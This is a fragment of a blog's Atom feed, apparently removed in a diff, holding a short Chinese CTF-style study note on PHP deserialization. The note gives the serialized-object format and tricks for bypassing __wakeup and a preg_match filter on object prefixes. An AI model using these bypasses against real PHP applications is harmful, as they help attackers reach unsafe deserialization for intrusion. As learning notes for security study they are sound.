-    <category term="SQL绕过" scheme="https://smileless-l.github.io/tags/SQL%E7%BB%95%E8%BF%87/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>PHP魔术技巧</title>
-    <link href="https://smileless-l.github.io/2026/01/28/php%E9%AD%94%E6%9C%AF%E6%8A%80%E5%B7%A7/"/>
-    <id>https://smileless-l.github.io/2026/01/28/php%E9%AD%94%E6%9C%AF%E6%8A%80%E5%B7%A7/</id>
-    <published>2026-01-28T13:45:00.000Z</published>
-    <updated>2026-02-06T16:56:27.596Z</updated>
-    
-    <content type="html"><![CDATA[<h1 id="php魔术技巧"><a href="#php魔术技巧" class="headerlink" title="php魔术技巧"></a>php魔术技巧</h1><p>标签（空格分隔）： PHP #魔术技巧#</p><p>—php</p><p>反序列化的基本格式：O:组的字节:”定义的组的名字”:有几个参数:{s:4:”flag”;s:3:”111”;}</p><p>构造脚本可以在后面这么加$A &#x3D; new Demo (‘fl4g.php’);&#x2F;&#x2F;创建对象<br>                                      $C &#x3D; serialize($A); </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">_wakeup()：如果察觉到有反序列化的参数值那么将会拒绝执行</span><br><span class="line">//绕过方法：将序列化的对象的属性（参数个数）个数改了</span><br><span class="line"></span><br><span class="line">__destruct():当对象的所有引用被删除或脚本执行结束时，PHP 会自动调用析构函数。</span><br><span class="line"></span><br><span class="line">preg_match(’/[oc]:\d+:/i’, $var)：当中括号的东西出现就会被过滤&#123;应对办法：单双引号绕过</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">__construct()：这是一个构造函数，在实例化一个对象的时候，首先会去自动执行的一个方法。</span><br></pre></td></tr></table></figure>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;h1 id=&quot;php魔术技巧&quot;&gt;&lt;a href=&quot;#php魔术技巧&quot; class=&quot;headerlink&quot; title=&quot;php魔术技巧&quot;&gt;&lt;/a&gt;php魔术技巧&lt;/h1&gt;&lt;p&gt;标签（空格分隔）： PHP #魔术技巧#&lt;/p&gt;
-&lt;p&gt;—php&lt;/p&gt;
-&lt;p&gt;反序列化的基本格式：</summary>
-      
-    
-    
-    
-    <category term="Web" scheme="https://smileless-l.github.io/categories/Web/"/>
-    
-    
-    <category term="PHP" scheme="https://smileless-l.github.io/tags/PHP/"/>
     
   </entry>
   
